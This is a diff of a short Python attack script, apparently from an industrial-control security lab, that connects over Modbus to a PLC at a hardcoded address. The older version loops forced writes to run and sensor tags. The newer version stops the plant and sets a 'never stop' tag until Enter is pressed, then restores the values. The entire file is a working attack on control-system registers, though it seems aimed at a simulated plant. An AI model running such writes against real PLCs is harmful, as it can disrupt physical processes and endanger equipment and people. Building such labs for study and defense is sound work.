@@ -1,37 +1,69 @@
-#!/usr/bin/env python
+#!/usr/bin/env python3
 
 #########################################
 # Imports
 #########################################
-# - Logging
+
 import logging
+import time
+import os
+import sys
+import json
+import threading
+import contextlib
 
-# - Attack communication
-from modbus	import ClientModbus as Client
-from modbus	import ConnectionException 
+sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
 
-# - World environement
-from world	import *
+with open(os.devnull, 'w') as fnull, contextlib.redirect_stdout(fnull), contextlib.redirect_stderr(fnull):
+    from world import (
+        PLC_RW_ADDR,
+        PLC_TAG_RUN,
+        PLC_TAG_NOZZLE,
+        PLC_TAG_NEVER_STOP
+    )
 
-#########################################
+from modbus import ClientModbus as Client
+from modbus import ConnectionException
+
 # Logging
-#########################################
 logging.basicConfig()
 log = logging.getLogger()
 log.setLevel(logging.INFO)
 
-#####################################
-# Stop and fill code
-#####################################
-client = Client(PLC_SERVER_IP, port=PLC_SERVER_PORT)
+PORTS_FILE = os.path.join(os.path.dirname(__file__), '..', 'ports.json')
+PORTS_FILE = os.path.abspath(PORTS_FILE)
+
+while not os.path.exists(PORTS_FILE):
+    print("En attente de world.py...")
+    time.sleep(1)
+
+with open(PORTS_FILE, "r") as f:
+    ports = json.load(f)
+
+client = Client("10.0.10.139", 2563)
+
+stop_attack = False
+
+def listen_for_enter():
+    input("")
+    global stop_attack
+    stop_attack = True
 
 try:
     client.connect()
-    while True:
-        rq = client.write(PLC_TAG_RUN, 1) 	# Run Plant, Run!
-        rq = client.write(PLC_TAG_LEVEL, 0) 	# Level Sensor
-        rq = client.write(PLC_TAG_CONTACT, 1) 	# Contact Sensor
-except KeyboardInterrupt:
-    client.close()
-except ConnectionException:
-    print "Unable to connect / Connection lost"
+
+    listener_thread = threading.Thread(target=listen_for_enter)
+    listener_thread.daemon = True
+    listener_thread.start()
+
+    client.write(PLC_RW_ADDR + PLC_TAG_RUN, 0)
+    client.write(PLC_RW_ADDR + PLC_TAG_NEVER_STOP, 2)
+
+    while not stop_attack:
+        time.sleep(0.5)
+
+    client.write(PLC_RW_ADDR + PLC_TAG_NEVER_STOP, 0)
+    client.write(PLC_RW_ADDR + PLC_TAG_RUN, 1)
+
+except Exception as e:
+    log.error(f"Erreur de connexion ou d'écriture : {e}")
